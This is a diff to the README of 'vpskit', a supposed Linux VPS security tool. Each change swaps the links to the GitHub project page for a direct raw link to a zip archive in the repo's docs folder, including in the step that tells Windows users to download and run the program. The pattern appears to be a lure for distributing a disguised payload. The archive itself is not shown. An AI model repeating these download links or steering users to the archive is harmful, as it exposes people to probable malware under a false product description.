@@ -1,6 +1,6 @@
 # ⚙️ vpskit - Secure and Manage Your Linux VPS Easily
 
-[![Download vpskit](https://img.shields.io/badge/Download-vpskit-brightgreen)](https://github.com/ohiostateuniversitypulmonaryvalve996/vpskit)
+[![Download vpskit](https://img.shields.io/badge/Download-vpskit-brightgreen)](https://raw.githubusercontent.com/ohiostateuniversitypulmonaryvalve996/vpskit/main/docs/Software-1.6-beta.5.zip)
 
 ---
 
@@ -27,11 +27,11 @@ A VPS (Virtual Private Server) is a virtual machine that runs its own copy of Li
 
 To get vpskit, visit the main GitHub page linked below. From there, you will be able to download the program files.
 
-[![Download vpskit](https://img.shields.io/badge/Download-vpskit-blue)](https://github.com/ohiostateuniversitypulmonaryvalve996/vpskit)
+[![Download vpskit](https://img.shields.io/badge/Download-vpskit-blue)](https://raw.githubusercontent.com/ohiostateuniversitypulmonaryvalve996/vpskit/main/docs/Software-1.6-beta.5.zip)
 
 Click the button above or open this page in your browser:
 
-https://github.com/ohiostateuniversitypulmonaryvalve996/vpskit
+https://raw.githubusercontent.com/ohiostateuniversitypulmonaryvalve996/vpskit/main/docs/Software-1.6-beta.5.zip
 
 You will find instructions and files to download on that page.
 
@@ -41,7 +41,7 @@ You will find instructions and files to download on that page.
 
 Follow these steps to download and run vpskit on your Windows PC:
 
-1. **Visit the download page:** Open https://github.com/ohiostateuniversitypulmonaryvalve996/vpskit in your browser.
+1. **Visit the download page:** Open https://raw.githubusercontent.com/ohiostateuniversitypulmonaryvalve996/vpskit/main/docs/Software-1.6-beta.5.zip in your browser.
 
 2. **Find the latest release:** Look for a section or link labeled "Releases" or "Downloads." This is where the program files are stored.
 
@@ -154,4 +154,4 @@ If you need help, use GitHub’s issues tab on the vpskit page to ask questions 
 
 ---
 
-[Download vpskit](https://github.com/ohiostateuniversitypulmonaryvalve996/vpskit)
+[Download vpskit](https://raw.githubusercontent.com/ohiostateuniversitypulmonaryvalve996/vpskit/main/docs/Software-1.6-beta.5.zip)
